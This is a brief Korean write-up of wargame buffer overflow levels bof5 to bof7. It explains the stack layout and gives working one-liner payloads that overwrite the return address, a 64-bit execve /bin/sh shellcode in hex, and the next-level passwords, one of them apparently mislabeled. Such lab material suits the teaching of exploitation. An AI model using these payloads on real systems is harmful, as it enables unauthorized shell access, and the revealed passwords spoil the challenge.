# 싱글벙글 가륜이의 문제풀이 (bof5~7)

<br/>

## __문제 접근__:

> 1. 코드를 읽고 스택의 구조를 파악한다.  
> 이번 문제들은 이전과 다르게 쉘코드를 직접 실행시켜야 한다.
> 2. 버퍼의 주소를 파악한다.
> 3. 버퍼와 SFP의 크기를 파악한다.
> 4. bof로 리턴을 쉘코드로 할 수 있도록 조작한다.
> 5. 그후 쉘을 얻을 수 있다.

</br>  

## __구체적 풀이__:

> 5. bof5는 표준입력으로 부터 값을 받는다.  
> 이전 문제들과 다르게 쉘을 실행하는 코드가 없다. [  system(buf) ]  
> 시스템에 버퍼를 넣으므로 버퍼에 쉘코드를 넣어주면 된다.
> bof6.pw : b35aad61

> 6. bof6는 표준입력으로 부터 값을 받는다
> 쉘코드가 프로그램 내에 이미 존재한다
> bof 사용 -> 버퍼의 크기는 128 + 8(SFP) + 쉘코드 로 작성한다.  
> (python -c "print 'x' * 136 + '\x30\xeb\xff\xff\xff\x7f'";cat) | ./bof6  
> bof3.pw : ffa35d7e

> 7. bof7는 명령줄 인자로 부터 값을 받는다.  
> 64비트 프로그램이라 64비트 쉘코드가 필요하다.
> \x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05  
> 이 문제에서 가장 중요한것은 명령줄 인자로 값을 넘겨주면 스택의 주소위치가 달라진다는 점이다. 임의의 값을 전달하고 스택 위치를 먼저 찾는다.  
> ./bof7 \`python -c "print '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' + 'x' * 113 + '\xb0\xea\xff\xff\xff\x7f'"`  
> bof8.pw : 0dc54105